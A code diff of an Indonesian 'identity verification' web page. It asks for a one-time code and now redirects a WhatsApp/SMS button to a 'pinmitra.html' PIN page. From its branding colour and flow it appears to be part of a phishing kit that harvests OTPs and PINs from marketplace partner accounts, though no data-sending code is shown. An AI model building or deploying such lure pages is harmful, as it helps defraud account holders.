@@ -1,114 +1,126 @@
 <!DOCTYPE html>
-<html lang="id">
+ <html lang="id">
+ <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verifikasi Identitas</title>
+  <!-- Gaya CSS (dapat ditempatkan di sini atau di file eksternal) -->
+  <style>
+  body {
+  font-family: Arial, sans-serif;
+  margin: 0;
+  padding: 0;
+  background-color: #f8f8f8;
+  color: #333;
+  }
 
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifikasi Identitas</title>
-    <!-- Gaya CSS (dapat ditempatkan di sini atau di file eksternal) -->
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f8f8f8;
-            color: #333;
-        }
 
-        .container {
-            max-width: 480px;
-            margin: 20px auto;
-            padding: 20px;
-            background-color: #fff;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        }
+  .container {
+  max-width: 480px;
+  margin: 20px auto;
+  padding: 20px;
+  background-color: #fff;
+  border-radius: 8px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+  }
 
-        h1 {
-            font-size: 1.5em;
-            margin-bottom: 10px;
-        }
 
-        p {
-            font-size: 1em;
-            margin-bottom: 20px;
-        }
+  h1 {
+  font-size: 1.5em;
+  margin-bottom: 10px;
+  }
 
-        .verification-option {
-            margin-bottom: 15px;
-        }
 
-        .verification-option button {
-            width: 100%;
-            padding: 10px;
-            font-size: 1em;
-            background-color: #ee4d2d;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
+  p {
+  font-size: 1em;
+  margin-bottom: 20px;
+  }
 
-        .verification-option button:hover {
-            background-color: #d0371a;
-        }
 
-        .otp-form {
-            margin-top: 20px;
-        }
+  .verification-option {
+  margin-bottom: 15px;
+  }
 
-        .otp-form input {
-            width: 100%;
-            padding: 10px;
-            font-size: 1em;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            margin-bottom: 10px;
-        }
 
-        .otp-form button {
-            width: 100%;
-            padding: 10px;
-            font-size: 1em;
-            background-color: #ee4d2d;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
+  .verification-option button {
+  width: 100%;
+  padding: 10px;
+  font-size: 1em;
+  background-color: #ee4d2d;
+  color: white;
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+  transition: background-color 0.3s;
+  }
 
-        .security {
-            margin-top: 20px;
-            font-size: 0.8em;
-            color: #777;
-        }
-    </style>
-    <script>
-        function showOtpForm() {
-            document.querySelector('.verification-option').style.display = 'none';
-            document.querySelector('.otp-form').style.display = 'block';
-        }
-    </script>
-</head>
 
-<body class="bg-white text-black min-h-screen">
-    <div class="container">
-        <h1>Verifikasi Identitas</h1>
-        <p>Untuk meningkatkan keamanan akun Anda, mohon verifikasi identitas Anda.</p>
-        <div class="verification-option">
-            <button onclick="showOtpForm()">Verifikasi melalui Akun Gmail</button>
-        </div>
-        <div class="otp-form" style="display:none;">
-            <p>Masukkan kode verifikasi (OTP) yang telah kami kirim ke akun Gmail Anda:</p>
-            <input type="text" placeholder="Kode OTP">
-            <button>Verifikasi</button>
-        </div>
-        <div class="security">
-            Data Anda aman dan terlindungi.
-        </div>
-    </div>
-</body>
+  .verification-option button:hover {
+  background-color: #d0371a;
+  }
 
-</html>
+
+  .otp-form {
+  margin-top: 20px;
+  }
+
+
+  .otp-form input {
+  width: 100%;
+  padding: 10px;
+  font-size: 1em;
+  border: 1px solid #ddd;
+  border-radius: 5px;
+  margin-bottom: 10px;
+  }
+
+
+  .otp-form button {
+  width: 100%;
+  padding: 10px;
+  font-size: 1em;
+  background-color: #ee4d2d;
+  color: white;
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+  transition: background-color 0.3s;
+  }
+
+
+  .security {
+  margin-top: 20px;
+  font-size: 0.8em;
+  color: #777;
+  }
+ </style>
+ <script>
+  function goToPinMitra() {
+  window.location.href = "pinmitra.html";
+  }
+ </script>
+ </head>
+ <body class="bg-white text-black min-h-screen">
+  <div class="container">
+  <h1>Verifikasi Identitas</h1>
+  <p>Untuk meningkatkan keamanan akun Anda, mohon verifikasi identitas Anda.</p>
+
+
+  <div class="verification-option">
+  <button onclick="goToPinMitra()">Verifikasi melalui WhatsApp/SMS</button>
+  </div>
+
+
+  <div class="otp-form" style="display:none;">
+  <p>Masukkan kode verifikasi (OTP) yang telah kami kirim:</p>
+  <input type="text" placeholder="Kode OTP">
+  <button>Verifikasi</button>
+  </div>
+
+
+  <div class="security">
+  Data Anda aman dan terlindungi.
+  </div>
+  </div>
+ </body>
+ </html>
